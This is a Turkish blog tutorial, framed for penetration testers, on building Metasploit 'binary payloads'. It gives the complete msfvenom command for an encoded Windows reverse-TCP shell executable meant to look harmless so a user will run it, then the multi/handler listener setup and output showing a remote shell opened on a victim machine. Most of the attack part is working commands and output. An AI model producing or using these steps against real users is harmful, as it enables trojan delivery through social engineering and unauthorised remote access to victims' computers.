---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-05-20T13:10:00Z"
excerpt: İstemci tarafı saldırılar, tüm ağ yöneticilerinin dikkat etmesi gerekli türden
  saldırılardır. Sisteminizin güvenliğini ne kadar sağlasanız da istemci tarafı saldırılar,
  kullanıcılarınızın zafiyetlerini kullanırlar.
guid: https://www.siberoloji.com/?p=1171
id: 1171
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Binary Payloads
url: /tr/msf-binary-payloads/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="i̇stemci-taraflı-saldırılar">İstemci Taraflı Saldırılar 
<!-- /wp:heading -->

  İstemci tarafı saldırılar, tüm ağ yöneticilerinin dikkat etmesi gerekli türden saldırılardır. Sisteminizin güvenliğini ne kadar sağlasanız da istemci tarafı saldırılar, kullanıcılarınızın zafiyetlerini kullanırlar. 
 

  Pentest işlemi gerçekleştirenler, sistemde bulunan kullanıcının, bir şekilde linke tıklamasını veya zararlı yazılım çalıştırmasını sağladığında kendilerine hedef sistemde kapı açmış olurlar. Bu sebeple, istemci taraflı saldırılar, kullanıcıyla etkileşim gerektirmektedir. Bu tür saldırılar, sosyal mühendislik çalışmalarını da gerektirir. 
 

  Metasploit Framework, bu tür zararlı kodların oluşturması için bir çok modül sağlamaktadır. 
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="binary-payloads">binary payloads 
<!-- /wp:heading -->

  binary payloads olarak adlandırılan çalıştırılabilir dosyalar, zararsız .exe dosyaları gibi görünse de aslında içinde tehlikeli kodlar bulunduran dosyalardır. Dosyayı alacak kullanıcıya, önemli bir dosya hissi uyandırarak tıklaması sağlanır ve zararlı kod çalışır. 
 

  Bu yazıda, Metasploit Framework tarafından sağlanan&nbsp;<code>msfvenom</code>&nbsp;komut satırı aracı kullanılacaktır.&nbsp;<code>msfvenom</code>&nbsp;kullanarak&nbsp;<code>.exe</code>,&nbsp;<code>perl</code>&nbsp;veya&nbsp;<code>c</code>&nbsp;program çıktıları elde edebilirsiniz. Burada&nbsp;<code>.exe</code>&nbsp;formatı kullanılacaktır. 
 

 
<h2 class="wp-block-heading" id="windows-reverse-shell-açan-payload-oluşturma">Windows Reverse Shell Açan Payload Oluşturma</h2>
<!-- /wp:heading -->

  Hedef kullanıcının zararlı programı çalıştırdığında dinleyen IP adresine bağlanması için bir payload oluşturmak için&nbsp;<code>windows/shell/reverse_tcp</code>&nbsp;modülünü kullanacağız. Öncelikle bu modülün çalışmak için hangi değişkenlere ihtiyaç duyduğuna bakalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
Options <strong>for </strong>payload/windows/shell/reverse_tcp:


       Name: Windows Command Shell, Reverse TCP Stager
     Module: payload/windows/shell/reverse_tcp
   Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 281
       Rank: Normal

Provided by:
    spoonm 
    sf 
    hdm 
    skape 

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique <strong>(</strong>Accepted: '', seh, thread, process, none<strong>)</strong>
LHOST                      yes       The listen address
LPORT     4444             yes       The listen port

Description:
  Spawn a piped command shell <strong>(</strong>staged<strong>)</strong>. Connect back to the attacker
</code></pre>
<!-- /wp:code -->

  Bu modül, çıktıda görüldüğü gibi&nbsp;<code>LHOST</code>&nbsp;ve&nbsp;<code>LPORT</code>&nbsp;değişkenlerinin ayarlanmasına ihtiyaç duymaktadır. Hedef platform olarak x86 mimari ve Windows işletim sistemi seçilmiştir. Oluşturacağımız payload için bir encoder kullanmamız gerekiyor. Bunun için de&nbsp;<code>x86/shikata_ga_nai</code>&nbsp;encoder modülünü kullanacağız. Bu şartlar altında aşağıdaki komut, encoder kullanarak&nbsp;<code>/tmp</code>&nbsp;klasörünün içinde&nbsp;<code>1.exe</code>&nbsp;isimli bir dosya oluşturacaktır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST<strong>=</strong>172.16.104.130 LPORT<strong>=</strong>31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 <strong>(</strong>iteration<strong>=</strong>0<strong>)</strong>
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
Saved as: /tmp/1.exe
</code></pre>
<!-- /wp:code -->

  <code>1.exe</code>&nbsp;dosyamızın türünü kontrol edelim.&nbsp;<code>file</code>&nbsp;komutuyla yaptığımız kontrolde&nbsp;<code>1.exe</code>&nbsp;doyasının MS Windows dosyası olduğu aşağıda görülmektedir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# file /tmp/1.exe
/tmp/1.exe: PE32 executable <strong>(</strong>GUI<strong>)</strong> Intel 80386, <strong>for </strong>MS Windows
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="dinleme-ayarları">Dinleme Ayarları</h2>
<!-- /wp:heading -->

  Elimizde istemcinin tıklayıp çalıştıracağı&nbsp;<code>1.exe</code>&nbsp;dosyası artık hazır durumda. Şimdi, tıklama işlemi gerçekleştiğinde dinleyecek bir modülü çalıştırmamız gerekiyor. Bunun için&nbsp;<code>exploit/multi/handler</code>&nbsp;modülünü ve içinde&nbsp;<code>payload windows/shell/reverse_tcp</code>&nbsp;dinleyici payload u kullanacağız. 
 

  Öncelikle&nbsp;<code>exploit/multi/handler</code>&nbsp;modülünü yükleyip seçeneklere bakalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> use exploit/multi/handler
msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> show options

Module options:

   Name  Current Setting  Required  Description 
   ----  ---------------  --------  ----------- 


Exploit target:

   Id  Name            
   --  ----            
   0   Wildcard Target
</code></pre>
<!-- /wp:code -->

  Gördüğünüz gibi exploit modülünde herhangi bir zorunlu değişken bulunmuyor. Şimdi payload ayarlaması yapalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set payload windows/shell/reverse_tcp
payload <strong>=&gt;</strong> windows/shell/reverse_tcp
msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> show options

Module options:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options <strong>(</strong>windows/shell/reverse_tcp<strong>)</strong>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST                      yes       The local address
   LPORT     4444             yes       The local port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target 
</code></pre>
<!-- /wp:code -->

  Bu çıktıda görülmektedir ki Payload için&nbsp;<code>LHOST</code>&nbsp;ve&nbsp;<code>LPORT</code>&nbsp;değerlerinin girilmesi gerekmekte. 
 

  <code>LHOST</code>: Local Host yani yerelde dinleyecek IP adresini, 
 

  <code>LPORT</code>: Local Port, yani dinleyecek Port numarasını ifade eder. 
 

  Bu değerlerin,&nbsp;<code>msfvenom</code>&nbsp;komutuyla oluşturduğumuz&nbsp;<code>1.exe</code>&nbsp;dosyası için girdiğimiz değerler ile aynı olmasına dikkat edin.&nbsp;<code>1.exe</code>&nbsp;dosyası içinde hangi değerler gömülü ise zararlı yazılım bu bilgilere göre haberleşme sağlamak isteyecektir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set LHOST 172.16.104.130
LHOST <strong>=&gt;</strong> 172.16.104.130
msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set LPORT 31337
LPORT <strong>=&gt;</strong> 31337
msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  Tüm ayarlamaları yaptıktan sonra&nbsp;<code>exploit</code>&nbsp;komutuyla modül çalıştırılır ve dinlemeye başlanır. Aşağıda, dinleme sonucunda gerçekleşen bir istemci tıklaması sonucu açılan komut satırı görülmektedir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> exploit

<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
<strong>[</strong><strong>*</strong><strong>]</strong> Starting the payload handler...
<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>474 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Command shell session 2 opened <strong>(</strong>172.16.104.130:31337 -&gt; 172.16.104.128:1150<strong>)</strong>

Microsoft Windows XP <strong>[</strong>Version 5.1.2600]
<strong>(</strong>C<strong>)</strong> Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Victim\My Documents&gt;</code></pre>
<!-- /wp:code -->